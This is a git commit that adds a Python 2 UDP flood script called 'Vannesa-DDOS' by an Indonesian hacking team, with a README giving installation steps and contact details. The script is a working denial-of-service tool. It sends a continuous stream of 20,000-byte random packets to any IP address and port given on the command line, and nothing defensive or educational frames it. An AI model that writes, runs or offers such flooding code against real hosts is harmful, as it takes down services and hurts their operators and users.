94eb531d4d3776bc9055a4dd0c5a7acd55fd975d
Mr.TamfanX <62769928+Anonymous3-SIT@users.noreply.github.com>
2020-04-01 15:19:23 +0700

    Add files via upload

---
+++ 80juta.py
@@ -0,0 +1,47 @@
+import time
+import socket
+import random
+import sys
+def usage():
+    print "\033[1;32m#############################################################"
+    print "#------------------------[\033[1;91mVannesa-DDOS\033[1;32m]---------------------#"
+    print "#-----------------------------------------------------------#"
+    print "#   \033[1;91mMenjalankan: " "python2 80juta.py " "<ip> <port> <packet> \033[1;32m    #"
+    print "#                                                           #"
+    print "#\033[1;91m Creator:Mr.TamfanX       Vanessa Angel DDOS               #"
+    print "#\033[1;91m Team   :SIT             PANTANG MUNDUR SEBELUM            #"
+    print "#\033[1;91m Version:1.0                    80 JUTA                    #"
+    print "#                                                           #"
+    print "#                                                           #"
+    print "#               \033[1;91m<--[ Shutdown Indo Team]-->               \033[1;32m#"
+    print "#############################################################"
+    print "                        @@@@@@@@@@"
+    print "                       @@@@@@@@@@@@"
+    print "                     @@@@@@@@@@@@@@@@"
+def flood(victim, vport, duration):
+    # Support us yaakk... :)
+    # Okey Jadi disini saya membuat server, Ketika saya memanggil "SOCK_DGRAM" itu  menunjukkan  UDP type program
+    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    # 20000 representasi satu byte ke server
+    bytes = random._urandom(20000)
+    timeout =  time.time() + duration
+    sent = 3000
+
+    while 1:
+        if time.time() > timeout:
+            break
+        else:
+            pass
+        client.sendto(bytes, (victim, vport))
+        sent = sent + 1
+        print "\033[1;91mMulai \033[1;32m%s \033[1;91mmengirim duit \033[1;32m%s \033[1;91m80 juta pada target \033[1;32m%s "%(sent, victim, vport)
+def main():
+    print len(sys.argv)
+    if len(sys.argv) != 4:
+        usage()
+    else:
+        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))
+
+if __name__ == '__main__':
+    main()
+
---
+++ README.md
@@ -0,0 +1,22 @@
+# VA-DDOS
+
+
+#INSTALLATION
+- pkg update && pkg upgrade
+- pkg install python2
+- pkg install git
+- git clone https://github.com/Anonymous3-SIT/VA-DDOS
+- cd VA-DDOS
+- chmod +x 80juta.py
+- ls
+- python2 80juta.py
+
+
+#INFO
+- WhatsApp : 628999271792
+- GitHub   : https://github.com/Anonymous3-SIT
+- Website  : https://mraliefrega.low.blog
+-Gmail     : anonymoussit36@gmail.com
+
+
+#Copyright@2020
